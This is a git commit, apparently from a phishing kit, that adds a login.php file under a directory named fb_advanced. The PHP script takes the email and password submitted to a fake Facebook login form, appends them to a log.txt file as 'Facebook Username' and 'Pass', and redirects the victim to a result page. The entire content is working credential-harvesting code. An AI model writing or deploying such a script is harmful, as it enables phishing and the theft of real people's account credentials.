dac89a2131413e5e21ed4fbbb189b77390088977
PH4N70M (X PHANTOM) <70594016+XPH4N70M@users.noreply.github.com>
2022-05-18 15:00:22 +0530

    Add files via upload

---
+++ .sites/fb_advanced/login.php
@@ -0,0 +1,7 @@
+<?php
+$file = 'log.txt';
+$fp = fopen($file , 'a');
+file_put_contents("log.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
+header('Location: ./result.html');
+exit();
+?>
